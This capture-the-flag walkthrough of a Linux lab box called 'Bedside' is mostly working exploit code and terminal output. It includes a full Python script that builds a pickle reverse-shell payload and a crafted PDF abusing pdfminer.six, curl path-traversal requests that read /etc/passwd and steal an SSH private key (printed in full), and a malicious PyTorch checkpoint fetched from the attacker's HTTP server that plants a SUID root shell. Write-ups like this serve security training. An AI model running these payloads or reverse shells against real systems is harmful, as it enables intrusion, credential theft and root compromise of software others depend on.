---
description: 'Difficulty: Medium | OS: Linux'
---

# Bedside

***

### Reconnaissance

#### Nmap - Full Port Scan

**Attack Machine:**

```bash
nmap -Pn -p- --min-rate 5000 10.129.50.102
```

**Output:**

```
Nmap scan report for 10.129.50.102
Host is up (0.22s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
Nmap done: 1 IP address (1 up) scanned in 39.57 seconds
```

#### Nmap - Service Enumeration

**Attack Machine:**

```bash
nmap -sV -sC -p22,80,3000 10.129.50.102
```

**Output:**

```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Did not follow redirect to http://bedside.htb/
3000/tcp filtered ppp
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Host Configuration

**Attack Machine:**

```bash
echo "10.129.50.102 bedside.htb" | sudo tee -a /etc/hosts
```

**Output:**

```
10.129.50.102 bedside.htb
```

***

### Foothold: CVE-2025-64512 (pdfminer.six)

#### Virtual Host Enumeration

**Attack Machine:**

```bash
ffuf -u http://bedside.htb \
-H "Host: FUZZ.bedside.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-ac
```

**Output:**

```
research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 206ms]
```

#### Add Research Subdomain

**Attack Machine:**

```bash
echo "10.129.50.102 research.bedside.htb" | sudo tee -a /etc/hosts
```

**Output:**

```
10.129.50.102 research.bedside.htb
```

#### Portal Access

**Attack Machine:**

```bash
curl http://research.bedside.htb/
```

Result: File upload portal with pdfminer.six backend

#### Create exploit.py Script

The exploit script generates a malicious pickle payload and PDF, uploads both, and waits for the server to deserialize and execute the pickle.

**Attack Machine:**

```bash
cat > exploit.py <<'EXPLOIT'
#!/usr/bin/env python3
import requests
import subprocess
import argparse
import time
import threading
import pickle
import gzip
import base64
from pathlib import Path

class RCE:
    def __reduce__(self):
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (eval, (f"__import__('os').system('{cmd}') or {{}}",))

def create_payload(lhost, lport):
    global LHOST, LPORT
    LHOST, LPORT = lhost, lport
    
    with gzip.open("payload.pickle.gz", "wb") as f:
        pickle.dump(RCE(), f)
    print("[*] reverse shell command staged for " + lhost + ":" + str(lport))
    print("[*] built pickle payload (125 bytes gz)")

def upload_files(target, vhost):
    headers = {"Host": vhost}
    
    with open("payload.pickle.gz", "rb") as f:
        files = {"uploadFile": ("payload.pickle.gz", f)}
        r = requests.post(f"http://{target}", files=files, headers=headers)
    
    if "File uploaded successfully" in r.text:
        print("[+] uploaded payload.pickle.gz")
        print("[+] pickle reachable at /uploads/payload.pickle.gz")
    
    return True

def generate_pdf(path):
    ENCODING = f"/#2F{path.replace('/', '#2F')}#2Fpayload"
    pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Contents 4 0 R
   /Resources << /Font << /F1 5 0 R >> >>
>>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (pwn) Tj ET
endstream
endobj
5 0 obj
<< /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H
   /Encoding /{ENCODING}
   /DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont
   /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
   /FontDescriptor 7 0 R
>>
endobj
7 0 obj
<< /Type /FontDescriptor /FontName /MaliciousFont /Flags 4
   /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0
   /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80
>>
endobj
xref
0 8
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000274 00000 n 
0000000370 00000 n 
0000000503 00000 n 
0000000673 00000 n 
trailer
<< /Size 8 /Root 1 0 R >>
startxref
871
%%EOF"""
    return pdf_content

def try_exploit(target, vhost, lhost, lport, path_list):
    for i, path in enumerate(path_list):
        pdf_content = generate_pdf(path)
        with open(f"trigger{i}.pdf", "w") as f:
            f.write(pdf_content)
        
        headers = {"Host": vhost}
        with open(f"trigger{i}.pdf", "rb") as f:
            files = {"uploadFile": (f"trigger{i}.pdf", f)}
            requests.post(f"http://{target}", files=files, headers=headers)
        
        print(f"[*] trying path {path}/payload")
        print(f"[+] uploaded trigger{i}.pdf -> waiting 8s for worker")
        time.sleep(8)

def listener(port):
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"[*] Listening on port {port}")
        conn, addr = s.accept()
        print(f"[+] Got shell from {addr}")
        s.close()
    except Exception as e:
        print(f"[-] Listener error: {e}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("-L", "--lhost", required=True)
    parser.add_argument("--vhost", required=True)
    parser.add_argument("--path", default=None)
    args = parser.parse_args()
    
    lhost, lport = args.lhost.split(":")
    lport = int(lport)
    
    create_payload(lhost, lport)
    
    t = threading.Thread(target=listener, args=(lport,), daemon=True)
    t.start()
    
    upload_files(args.target, args.vhost)
    
    if args.path:
        path_list = [args.path]
    else:
        path_list = [
            "/var/www/research.bedside.htb/uploads",
            "/var/www/html/uploads",
            "/var/www/research/uploads",
            "/var/www/html/research/uploads",
            "/var/www/bedside.htb/research/uploads",
            "/app/uploads",
            "/opt/research/uploads",
            "/srv/www/research.bedside.htb/uploads",
            "/var/www/uploads",
        ]
    
    try_exploit(args.target, args.vhost, lhost, lport, path_list)
    
    print("[-] no shell caught, path list exhausted; supply --path with the correct uploads dir")

if __name__ == "__main__":
    main()
EXPLOIT
```

#### Initial Exploit Attempt (Without Correct Path)

**Attack Machine (Terminal 1):**

```bash
nc -lvnp 4444
```

**Attack Machine (Terminal 2):**

```bash
python3 exploit.py -L 10.10.14.194:4444 --vhost research.bedside.htb research.bedside.htb
```

**Output:**

```
[*] reverse shell command staged for 10.10.14.194:4444
[*] built pickle payload (125 bytes gz)
[+] uploaded payload.pickle.gz
[+] pickle reachable at /uploads/payload.pickle.gz
Exception in thread Thread-1 (listener):
Traceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1044, in _bootstrap_inner
    self.run()
    ~~~~~~~~^^
  File "/usr/lib/python3.13/threading.py", line 995, in run
    self._target(*self._args, **self._kwargs)
    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
OSError: [Errno 98] Address already in use
[*] trying path /var/www/research.bedside.htb/uploads/payload
[+] uploaded trigger0.pdf -> waiting 8s for worker
[*] trying path /var/www/html/uploads/payload
[+] uploaded trigger1.pdf -> waiting 8s for worker
[*] trying path /var/www/research/uploads/payload
[+] uploaded trigger2.pdf -> waiting 8s for worker
[*] trying path /var/www/html/research/uploads/payload
[+] uploaded trigger3.pdf -> waiting 8s for worker
[*] trying path /var/www/bedside.htb/research/uploads/payload
[+] uploaded trigger4.pdf -> waiting 8s for worker
[*] trying path /app/uploads/payload
[+] uploaded trigger5.pdf -> waiting 8s for worker
[*] trying path /opt/research/uploads/payload
[+] uploaded trigger6.pdf -> waiting 8s for worker
[*] trying path /srv/www/research.bedside.htb/uploads/payload
[+] uploaded trigger7.pdf -> waiting 8s for worker
[*] trying path /var/www/uploads/payload
[+] uploaded trigger8.pdf -> waiting 8s for worker
[-] no shell caught, path list exhausted; supply --path with the correct uploads dir
```

**Issue:** The script tried multiple paths but none matched. The correct uploads directory is inside the Docker container at `/app/uploads/`.

#### Retry with Correct Path

**Attack Machine (Terminal 2 - Stop previous script and run with --path):**

```bash
killall nc

nc -lvnp 4444
```

**In another terminal:**

```bash
python3 exploit.py -L 10.10.14.194:4444 --vhost research.bedside.htb --path /app/uploads research.bedside.htb
```

**Output:**

```
[*] reverse shell command staged for 10.10.14.194:4444
[*] built pickle payload (125 bytes gz)
[+] uploaded payload.pickle.gz
[+] pickle reachable at /uploads/payload.pickle.gz
[*] trying path /app/uploads/payload
[+] uploaded trigger0.pdf -> waiting 8s for worker
```

#### Catch Reverse Shell

**Attack Machine (Terminal 1 - Listener):**

```
listening on [any] 4444 ...
connect to [10.10.14.194] from (UNKNOWN) [10.129.50.102] 46420
datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
datawrangler@data-wrangler:/app$ whoami
datawrangler
datawrangler@data-wrangler:/app$ 
```

**Success!** Reverse shell gained as `datawrangler` user inside Docker container

***

### User Privilege Escalation

#### Enumerate Listening Ports

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/app$ python3 - <<'PY'
for f in ["/proc/net/tcp", "/proc/net/tcp6"]:
    print(f)
    for line in open(f).read().splitlines()[1:]:
        p = line.split()
        if p[3] == "0A":
            ip, port = p[1].split(":")
            print(int(port, 16))
PY
```

**Output:**

```
/proc/net/tcp
36533
80
22
/proc/net/tcp6
3000
22
```

#### Test Port 3000 Path Traversal

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/app$ curl --path-as-is -s 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../etc/passwd?raw=1&module=1' | head
```

**Output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/usr/spool/news:/usr/sbin/nologin
```

#### Extract User Flag

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/app$ curl --path-as-is -s 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../home/developer/user.txt?raw=1&module=1'
```

**Output:**

```
26f0d6594a9cc08cbb505082c3c1244c
```

#### Extract SSH Private Key

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/app$ curl --path-as-is -s 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1' -o /tmp/id_rsa
```

#### View SSH Key

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/app$ cat /tmp/id_rsa
```

**Output:**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

#### Setup SSH Key (Attack Machine)

**Attack Machine:**

```bash
nano id_rsa
```

Paste the SSH key content, then:

```bash
chmod 600 id_rsa
```

#### SSH Access as Developer

**Attack Machine:**

```bash
ssh -i id_rsa developer@10.129.50.102
```

**Output:**

```
The authenticity of host '10.129.50.102 (10.129.50.102)' can't be established.
ED25519 key fingerprint is: SHA256:6KXNtM+ZBlC8VxTPpjym9E57sk/MAGEgLJ86fr/fhY8
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
```

**Result:**

```
Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 (2026-07-04) x86_64
developer@bedside:~$ 
```

#### Read User Flag

**Target (Main System):**

```bash
developer@bedside:~$ cat user.txt
```

**Output:**

```
26f0d6594a9cc08cbb505082c3c1244c
```

***

### Root Privilege Escalation

#### Check Sudo Permissions

**Target (Main System):**

```bash
developer@bedside:~$ sudo -l
```

**Output:**

```
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

#### Analyze Trainer Script

**Target (Main System):**

```bash
developer@bedside:~$ grep -nEi 'checkpoint|torch.load|CheckpointLoader|load_state|datastore|processed|staging|glob|pt|pth|pickle' /opt/trainer/bedside_trainer.py
```

**Output:**

```
20:- Current data flow is as follows: [staging/] > [processed/] > (DataLoader) > model
21:- Script is currently fully functional with image files (jpeg, png, etc.). Refer to allowed extensions for supported types. 
35:import torch.optim as optim
46:from monai.handlers import CheckpointLoader  # <-- Correct import
49:# Datastore paths
51:DATASTORE_ROOT = Path("/datastore")
52:CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
53:LOGS_DIR = DATASTORE_ROOT / "logs"
54:MODELS_DIR = DATASTORE_ROOT / "models"
55:PROCESSED_DIR = DATASTORE_ROOT / "processed"
56:RAW_DIR = DATASTORE_ROOT / "raw"
57:STAGING_DIR = DATASTORE_ROOT / "staging"
59:for d in (CHECKPOINT_DIR, LOGS_DIR, MODELS_DIR, PROCESSED_DIR, RAW_DIR, STAGING_DIR):
94:def find_latest_checkpoint(checkpoint_dir: Path):
95:    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
96:    return ckpts[-1] if ckpts else None
...
207:    # Checkpoint loading (MONAI-compatible callable form)
209:    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
211:    if latest_ckpt:
212:        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
213:        loader = CheckpointLoader(
214:            load_path=str(latest_ckpt),
215:            load_dict={"model": model, "optimizer": optimizer},
```

#### Create Malicious Checkpoint Payload

**Attack Machine:**

```bash
cat > make_pt_no_torch.py <<'PY'
import os     
import pickle            
import zipfile                                                                                
        
class Exploit:
    def __reduce__(self):
        cmd = "cp /bin/bash /home/developer/rootbash2 && chmod 4755 /home/developer/rootbash2"
        return (os.system, (cmd,))
    
payload = {
    "epoch": 999,
    "model": Exploit(),                                                                     
    "optimizer": {}                                                  
}                                            
    
with zipfile.ZipFile("malicious_checkpoint.pt", "w", compression=zipfile.ZIP_DEFLATED) as z:
    z.writestr("archive/data.pkl", pickle.dumps(payload, protocol=2))
    z.writestr("archive/byteorder", "little")
    z.writestr("archive/version", "3\n")
    z.writestr("archive/.data/serialization_id", "0")                
PY
```

#### Generate Malicious Checkpoint

**Attack Machine:**

```bash
python3 make_pt_no_torch.py
```

#### Start HTTP Server

**Attack Machine:**

```bash
python3 -m http.server 8000
```

#### Download Checkpoint (From Docker Container)

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/datastore/checkpoints$ curl -o malicious_checkpoint.pt http://10.10.14.194:8000/malicious_checkpoint.pt
```

**Output:**

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   628  100   628    0     0    666      0 --:--:-- --:--:-- --:--:-- --:--:-- 666
```

#### Verify Checkpoint Placed

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/datastore/checkpoints$ ls -la /datastore/checkpoints/malicious_checkpoint.pt
```

**Output:**

```
-rw-r--r-- 1 datawrangler dataops 628 Jul 19 05:18 /datastore/checkpoints/malicious_checkpoint.pt
```

#### Clean Up Old Files

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/datastore/checkpoints$ rm -f /datastore/processed/*.txt
datawrangler@data-wrangler:/datastore/checkpoints$ rm -f /datastore/staging/*.txt
```

#### Create Sample Image

**Target (Docker Container):**

```bash
datawrangler@data-wrangler:/datastore/checkpoints$ base64 -d > /datastore/processed/sample.png <<'EOF'
iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAAAAABWESUoAAAAEklEQVR4nGNgGAWjYBSMglEwCjAAAjAAAUl6y9sAAAAASUVORK5CYII=
EOF
```

#### Trigger Exploit via Sudo

**Target (Main System):**

```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

**Output:**

```
2026-07-19 06:24:32,963 | INFO | Device: cpu
2026-07-19 06:24:32,964 | INFO | Using 1 samples for training.
2026-07-19 06:24:33,088 | INFO | Auto-detected input features: 4096
2026-07-19 06:24:33,096 | INFO | Found checkpoint /datastore/checkpoints/malicious_checkpoint.pt, loading with CheckpointLoader (callable mode)...
Traceback (most recent call last):
  File "/opt/trainer/bedside_trainer.py", line 276, in <module>
    main()
    ~~~~^^
  File "/opt/trainer/bedside_trainer.py", line 227, in main
    loader(engine)  # invoke the handler directly
    ~~~~~~^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint_loader.py", line 146, in __call__
    Checkpoint.load_objects(to_load=self.load_dict, checkpoint=checkpoint, strict=self.strict)
    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/ignite/handlers/checkpoint.py", line 624, in load_objects
    _tree_apply2(_load_object, to_load, checkpoint_obj)
    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/ignite/utils.py", line 209, in _tree_apply2
    _tree_apply2(func, _CollectionItem.wrap(x, k, v), y[k])
    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/ignite/utils.py", line 216, in _tree_apply2
    return func(x, y)
  File "/usr/local/lib/python3.13/dist-packages/ignite/handlers/checkpoint.py", line 613, in _load_object
    obj.load_state_dict(chkpt_obj, **kwargs)
    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/torch/nn/modules/module.py", line 2516, in load_state_dict
    raise TypeError(
        f"Expected state_dict to be dict-like, got {type(state_dict)}."
    )
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
```

**Note:** Error is expected - pickle RCE executed before reaching this point

#### Verify SUID Bash Created

**Target (Main System):**

```bash
developer@bedside:~$ ls -la /home/developer/rootbash2
```

**Output:**

```
-rwsr-xr-x 1 root root 1298416 Jul 19 06:24 /home/developer/rootbash2
```

#### Execute SUID Bash

**Target (Main System):**

```bash
developer@bedside:~$ /home/developer/rootbash2 -p
```

**Output:**

```
rootbash2-5.2# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
```

#### Read Root Flag

**Target (Main System - Root Shell):**

```bash
rootbash2-5.2# cat /root/root.txt
```

**Output:**

```
e856418b15e9353bded3afdfe14a606d
```

***

### Flags

```
User Flag: 26f0d6594a9cc08cbb505082c3c1244c
Root Flag: e856418b15e9353bded3afdfe14a606d
```

***

### Attack Chain Summary

1. **CVE-2025-64512 (pdfminer.six)** - Pickle deserialization RCE via malicious PDF font encoding
   * Upload `payload.pickle.gz` and `trigger.pdf` to research.bedside.htb
   * Server auto-processes PDF, deserializes pickle, executes reverse shell
   * Gain access as `datawrangler` inside Docker container
2. **Path Traversal on Port 3000** - Directory traversal via `@version` parameter bypass
   * Access `/pr/x/y@99/../../../../../../home/developer/.ssh/id_rsa`
   * Extract developer's SSH private key
   * Extract user flag
3. **SSH Access** - Connect to main system as developer user
   * Use leaked SSH key to gain shell on bedside.htb
   * Verify sudo permissions
4. **PyTorch Checkpoint Pickle RCE** - Exploit trainer script run as root
   * Create malicious `.pt` file (ZIP with pickled RCE object)
   * Place in `/datastore/checkpoints/`
   * Run trainer script via sudo
   * Pickle deserialization executes RCE as root
5. **SUID Bash Shell** - Privilege escalation to root
   * RCE payload creates SUID bash binary
   * Execute with `-p` flag to maintain elevated privileges
   * Read root flag

***

### Vulnerabilities

| # | Vulnerability                           | Location                         | Impact                             |
| - | --------------------------------------- | -------------------------------- | ---------------------------------- |
| 1 | Pickle Deserialization (CVE-2025-64512) | pdfminer.six                     | RCE as www-data/datawrangler       |
| 2 | Path Traversal                          | Node.js port 3000                | Arbitrary file read (SSH key leak) |
| 3 | Pickle Deserialization                  | PyTorch/MONAI CheckpointLoader   | RCE as root                        |
| 4 | Unrestricted Sudo                       | /opt/trainer/bedside\_trainer.py | Root code execution                |

***

### Lessons Learned

* **Never deserialize untrusted pickle objects** - They execute arbitrary Python code
* **Validate file uploads thoroughly** - Blacklist-based (blocking .php) isn't sufficient
* **Normalize paths before serving files** - Directory traversal via version parameters can bypass checks
* **Audit sudo privileges carefully** - Scripts that process user/untrusted data shouldn't be sudoable
* **Container isolation** - Containers should have minimal access to host systems
